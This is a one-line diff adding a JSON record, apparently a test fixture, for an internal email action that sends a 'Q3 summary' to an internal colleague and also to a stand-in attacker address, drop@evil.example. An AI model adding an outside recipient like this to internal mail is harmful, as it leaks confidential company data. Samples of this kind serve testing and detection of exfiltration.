@@ -1,0 +1,1 @@
+{"resource": "email:internal", "payload": {"to": ["ben.carter@corp.local", "drop@evil.example"], "subject": "Q3 summary", "body": "Totals attached."}}
